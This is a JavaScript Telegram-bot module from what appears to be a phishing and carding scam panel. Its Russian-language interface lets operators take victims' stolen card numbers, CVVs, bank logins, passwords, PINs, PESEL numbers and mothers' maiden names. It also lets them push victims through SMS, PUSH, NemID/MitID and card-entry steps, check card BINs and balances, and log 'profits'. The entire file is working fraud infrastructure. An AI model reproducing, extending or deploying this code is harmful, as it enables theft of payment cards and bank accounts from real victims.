const { Composer, Markup } = require("telegraf");
const axios = require("axios");
const escapeHTML = require("escape-html");

const bot = new Composer(async (ctx, next) => next());

const getCurCode = require("./handlers/functions/getCurCode");
const {
  Logs,
  items,
  users,
  settings,
  services,
  countries,
} = require("./database/index");

bot.use(require("./middlewares/writer"));

var workerStatuses = {
  log: {
    sms: "💬 Твоему мамонту https://t.me/end_soft отправили SMS",
    push: "📲 У твоего мамонта запросили PUSH подтверждение",
    skip: "❌ Лог был скипнут",
    change: "♻️ Мамонта просят сменить карту",
    custom: "😨 Мамонту отправили кастомную ошибка",
    card: "💳 Мамонта направили на ввод карты",
    inputYourBalance: "💰 У мамонта запросили точный баланс",
    nemid_dk_lk: "🔐 Мамонта отправили на ввод лк NemID",
    mitid_dk_lk: "🔐 Мамонта отправили на ввод лк MitID",
    refresh: "🔁 Мамонту перезагрузили страницу",
    wait: "⏳ Мамонта отправили на страницу ожидания",
    lkCard: "💳 Мамонта направили на ввод карты",
    hold: "⏰ Мамонта отправили на таймер",
    wrongLk: "❌ Мамонт ввел неверные данные от ЛК"
  },
};

var status = {
  log: {
    sms: "SMS",
    push: "PUSH",
    skip: "Скип",
    change: "СМЕНА",
    custom: "СВОЯ ОШИБКА",
    card: "ВВОД КАРТЫ",
    inputYourBalance: "ТОЧНЫЙ БАЛАНС",
    nemid_dk_lk: "ЛК NemID",
    mitid_dk_lk: "ЛК MitID",
    refresh: "ПЕРЕЗАГРУЗКА",
    wait: "ОЖИДАНИЕ",
    wrongData: "НЕВЕРНЫЕ ДАННЫЕ",
    lkCard: "ВВОД КАРТЫ",
    hold: "ТАЙМЕР",
    wrongLk: "НЕВЕРНЫЕ ДАННЫЕ"
  },
};

async function vbivButtons(logId) {
  const buttons = Markup.inlineKeyboard([
    [Markup.callbackButton("✅ Залет", `log_profit_${logId}`)],
    [
      Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
      Markup.callbackButton("PUSH", `log_${logId}_setStatus_push`),
    ],
    [
      Markup.callbackButton("НЕ БЬЕТСЯ", `log_${logId}_setStatus_skip`),
      Markup.callbackButton("СМЕНИТЬ КАРТУ", `log_${logId}_setStatus_change`),
    ],
    [
      Markup.callbackButton("СВОЯ ОШИБКА", `log_${logId}_setStatus_custom`),
      Markup.callbackButton("ВВОД КАРТЫ", `log_${logId}_setStatus_card`),
    ],
    [
      Markup.callbackButton(
        "БАЛАНС",
        `log_${logId}_setStatus_inputYourBalance`
      ),
      Markup.callbackButton("ЛК", `log_${logId}_setStatus_lk`),
    ],
    [
      Markup.callbackButton("ПЕРЕЗАГРУЗКА", `log_${logId}_setStatus_refresh`),
      Markup.callbackButton("ОЖИДАНИЕ", `log_${logId}_setStatus_wait`),
    ],
    [Markup.callbackButton("❌ Уйти со вбива", `log_${logId}_leave`)],
  ]);

  return buttons;
}

async function lkButtons(logId) {
  const buttons = Markup.inlineKeyboard([
    [Markup.callbackButton("✅ Залет", `log_profit_${logId}`)],
    [
      // Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
      Markup.callbackButton("PUSH", `log_${logId}_setStatus_push`),
      Markup.callbackButton("ТАЙМЕР", `log_${logId}_setStatus_hold`),
    ],
    [
      Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
    ],
    // [
    //   Markup.callbackButton("НЕВЕРНЫЙ ДАННЫЕ", `log_${logId}_setStatus_wrongData`),
    // ],
    [
    //   Markup.callbackButton("СВОЯ ОШИБКА", `log_${logId}_setStatus_custom`),
      Markup.callbackButton("ВВОД КАРТЫ", `log_${logId}_setStatus_lkCard`),
      Markup.callbackButton("НЕВЕРНЫЕ ДАННЫЕ", `log_${logId}_setStatus_wrongLk`),
    ],
    [Markup.callbackButton("❌ Уйти со вбива", `log_${logId}_leave`)],
  ]);

  return buttons;
}

async function converter(amount, currency) {
  try {
    var balance = "";

    if (amount == null) return "чекер баланса выключен";

    await axios
      .get("https://www.cbr-xml-daily.ru/daily_json.js")
      .then(async function (res) {
        let course = res.data.Valute[currency].Value;

        const symbols = {
          PLN: "zł",
          EUR: "€",
          DKK: "kr",
        };

        let rub = amount * course;

        balance = `${amount} ${symbols[currency]} / ${rub.toFixed(2)} ₽ / ${(
          rub / res.data.Valute.EUR.Value
        ).toFixed(2)} €`;
      });

    return balance;
  } catch (err) {
    console.log(err);
    return "не удалить сонвертировать баланс";
  }
}

async function binInfo(number) {
  try {
    var info = "";

    await axios
      .get(`https://bins.antipublic.cc/bins/${number}`)
      .then(async function (res) {
        if (res.data.bank == null) return (info = "");
        info = `\n- Бренд: <b>${res.data.brand}</b>
- Страна: <b>${res.data.country_flag} ${res.data.country_name}</b>
- Банк: <b>${res.data.bank}</b>
- Уровень: <b>${res.data.level}</b>
- Тип: <b>${res.data.type}</b>\n`;
      })
      .catch(async function (err) {
        info = "";
      });

    return info;
  } catch (err) {
    return "";
  }
}

// выкинуть со вбива
bot.action(/^log_removeVbiver_(\d+)$/, async (ctx, next) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

    if (ctx.state.user.admin == true) await next();
    else return ctx.answerCbQuery("⚠️ Ты не администратор дружище", true);

    await ctx.telegram
      .deleteMessage(log.vbiverId, log.vbiverMsgId, log.vbiverMsgId)
      .catch((err) => err);

    await log.update({
      vbiverId: null,
    });

    return ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [Markup.callbackButton("Взять", `log_take_${log.id}`)],
      ])
    );
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

// уйти со вбива
bot.action(/^log_(\d+)_leave$/, async (ctx, next) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

    await log.update({
      vbiverId: null,
    });

    await ctx.deleteMessage().catch((err) => err);

    await ctx.telegram
      .editMessageReplyMarkup(
        ctx.state.settings.logsId,
        log.messageId,
        log.messageId,
        Markup.inlineKeyboard([
          [Markup.callbackButton("Взять", `log_take_${log.id}`)],
        ])
      )
      .catch((err) => err);

    return ctx.telegram.sendMessage(
      ctx.state.settings.logsId,
      `❌ Вбивер <b>${ctx.from.username}</b> отказался от лога!`,
      {
        parse_mode: "HTML",
        reply_to_message_id: log.messageId,
      }
    );
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

bot.action(/^log_back_(\d+)$/, async (ctx) => {
  try {
    return ctx
      .editMessageReplyMarkup(await vbivButtons(ctx.match[1]))
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

// смена статуса
bot.action(
  /^log_(\d+)_setStatus_(wrongLk|hold|lkCard|wrongData|lk|wait|refresh|mitid_dk_lk|nemid_dk_lk|inputYourBalance|card|custom|sms|change|skip|push)$/,
  async (ctx) => {
    try {
      const log = await Logs.findOne({
        where: {
          id: ctx.match[1],
        },
      });

      if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

      const item = await items.findOne({
        where: {
          id: log.itemId,
        },
      });

      if (!item) return ctx.answerCbQuery("⚠️ Объявление не найдено", true);

      if (ctx.from.id != log.vbiverId) {
        await ctx.deleteMessage().catch((err) => err);
        return ctx
          .answerCbQuery("❌ Это не твой лог!", true)
          .catch((err) => err);
      }

      await ctx.answerCbQuery().catch((err) => err);

      if (ctx.match[2] == "lk") {
        return ctx
          .editMessageReplyMarkup(
            Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "🇩🇰 NemID",
                  `log_${log.id}_setStatus_nemid_dk_lk`
                ),
                Markup.callbackButton(
                  "🇩🇰 MitID",
                  `log_${log.id}_setStatus_mitid_dk_lk`
                ),
              ],
              [Markup.callbackButton(`< Назад`, `log_back_${log.id}`)],
            ])
          )
          .catch((err) => err);
      }

      const service = await services.findOne({
        where: {
          code: item.serviceCode,
        },
      });

      const country = await countries.findOne({
        where: {
          code: service.country,
        },
      });

      const worker = await users.findOne({
        where: {
          id: item.workerId,
        },
      });

      await ctx.telegram.sendMessage(
        item.workerId,
        `<b>${workerStatuses.log[ctx.match[2]]}</b>

${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
▫️ <b>Объявление:</b> ${item.title} 
▫️ <b>Цена:</b> ${item.price} ${await getCurCode(service.currency)}
▫️ <b>ID:</b> ${item.id}

🥷 <b>Вбивер:</b> @${ctx.from.username}`,
        {
          parse_mode: "HTML",
          reply_to_message_id: item.cardMsgId,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
            [
              Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
              Markup.callbackButton(`Чат`, `chat_${item.id}`),
            ],
          ]),
        }
      );

      var data = ""

    if(log.other != null) data = {
      login: log.other.login
        ? escapeHTML(String(log.other.login).trim())
        : null,
      password: log.other.password
        ? escapeHTML(String(log.other.password).trim())
        : null,
      pesel: log.other.pesel
        ? escapeHTML(String(log.other.pesel).trim())
        : null,
      pin: log.other.pin ? escapeHTML(String(log.other.pin).trim()) : null,
      motherlastname: log.other.motherlastname
        ? escapeHTML(String(log.other.motherlastname).trim())
        : null,
    };

      var lkData = "";

      var translate = {
        login: "🙋‍♂️ Логин",
        password: "🔐 Пароль",
        pesel: "🐶 Песель",
        pin: "🔑 ПИН",
        motherlastname: "👨‍👩‍👧‍👦 Девичья фамилия матери",
      };

      Object.keys(data).map((v) => {
        if (data[v]) lkData += `\n${translate[v]}: <code>${data[v]}</code>`;
      });

      var text;

      if (log.other == null)
        text = `🥷 <b>Вы взяли лог на вбив</b>
      
💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${log.cardCvv}</code>${
          log.cardBalance == null
            ? ""
            : `\n\n💰 <b>Баланс мамонта:</b> ${await converter(
                log.cardBalance,
                item.currency
              )}`
        }
${await binInfo(log.cardNumber.replace(/\s/g, ""))}
${Array.from(country.title)[0] + Array.from(country.title)[1]}<b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}

Статус: <b>${status.log[ctx.match[2]]}</b>`;
      else if(log.other != null && log.cardNumber != null) text = `🥷 <b>Вы взяли лог на вбив</b>
${lkData}
          
🏦 <b>Банк:</b> <b>${log.other.bank}</b>

💳 <b>Номер https://t.me/end_soft карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\n💰 <b>Баланс мамонта:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }

${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}

Статус: <b>${status.log[ctx.match[2]]}</b>`
      else
        text = `🥷 <b>Вы взяли лог на вбив</b>
${lkData}
    
🏦 <b>Банк:</b> <b>${log.other.bank}</b>

💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\n💰 <b>Баланс мамонта:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }

${Array.from(country.title)[0] + Array.from(country.title)[1]}<b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}

Статус: <b>${status.log[ctx.match[2]]}</b>`;

      await ctx
        .editMessageText(text, {
          parse_mode: "HTML",
          reply_markup: log.lk == false ? await vbivButtons(log.id) : await lkButtons(log.id),
        })
        .catch((err) => err);

      if (ctx.match[2] == "custom")
        return ctx.scene.enter("customError", {
          logId: log.id,
        });

      if(ctx.match[2] == "lkCard") await setTimeout(async() => {
        await log.update({
          status: null
        })
      }, 1500)
        
      return log.update({
        status: ctx.match[2],
      });
    } catch (err) {
      console.log(err);
      try {
        return ctx.answerCbQuery(
          "🤖 Возникла ошибка при обработке данных пользователя!",
          true
        );
      } catch (err) {
        return ctx.replyWithHTML(
          "🤖 Возникла ошибка при обработке данных пользователя!"
        );
      }
    }
  }
);

// добавление профита
bot.action(/^log_profit_(\d+)$/, async (ctx) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return ctx.answerCbQuery("⚠️ Объявление не найдено", true);

    await log.update({
      status: "successTransaction",
    });

    return ctx.scene.enter("addProfit", {
      itemId: item.id,
      logId: log.id,
    });
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

// взятие лога
bot.action(/^log_take_(\d+)$/, async (ctx) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

    await log.update({
      vbiverId: ctx.from.id,
    });

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return ctx.answerCbQuery("⚠️ Объявление не найдено", true);

    await ctx
      .editMessageReplyMarkup(
        Markup.inlineKeyboard([
          [
            Markup.urlButton(
              `⏳ Вбивает ${ctx.from.username}`,
              `https://t.me/${ctx.from.username}`
            ),
          ],
          [
            Markup.callbackButton(
              `❌ Убрать со вбива`,
              `log_removeVbiver_${ctx.match[1]}`
            ),
          ],
        ])
      )
      .catch((err) => err);

    var balance = await converter(log.cardBalance, item.currency);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    var data = ""

    if(log.other != null) data = {
      login: log.other.login
        ? escapeHTML(String(log.other.login).trim())
        : null,
      password: log.other.password
        ? escapeHTML(String(log.other.password).trim())
        : null,
      pesel: log.other.pesel
        ? escapeHTML(String(log.other.pesel).trim())
        : null,
      pin: log.other.pin ? escapeHTML(String(log.other.pin).trim()) : null,
      motherlastname: log.other.motherlastname
        ? escapeHTML(String(log.other.motherlastname).trim())
        : null,
    };

    var lkData = "";

    var translate = {
      login: "🙋‍♂️ Логин",
      password: "🔐 Пароль",
      pesel: "🐶 Песель",
      pin: "🔑 ПИН",
      motherlastname: "👨‍👩‍👧‍👦 Девичья фамилия матери",
    };

    Object.keys(data).map((v) => {
      if (data[v]) lkData += `\n${translate[v]}: <code>${data[v]}</code>`;
    });

    var text;

    if (log.other == null)
      text = `🥷 <b>Вы взяли лог на вбив</b>
    
💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\n💰 <b>Баланс мамонта:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }
    ${await binInfo(log.cardNumber.replace(/\s/g, ""))}
${Array.from(country.title)[0] + Array.from(country.title)[1]
}<b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${
    item.status
  }.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}`;
    else
      text = `🥷 <b>Вы взяли лог на вбив</b>
${lkData}
    
🏦 <b>Банк:</b> <b>${log.other.bank}</b>

💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\n💰 <b>Баланс мамонта:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }

${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}`;

    const msg = await ctx.telegram
      .sendMessage(ctx.from.id, text, {
        parse_mode: "HTML",
        reply_markup: log.lk == false ? await vbivButtons(log.id) : await lkButtons(log.id),
      })
      .catch((err) => err);
    return log.update({
      vbiverMsgId: msg.message_id,
    });
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

module.exports = bot;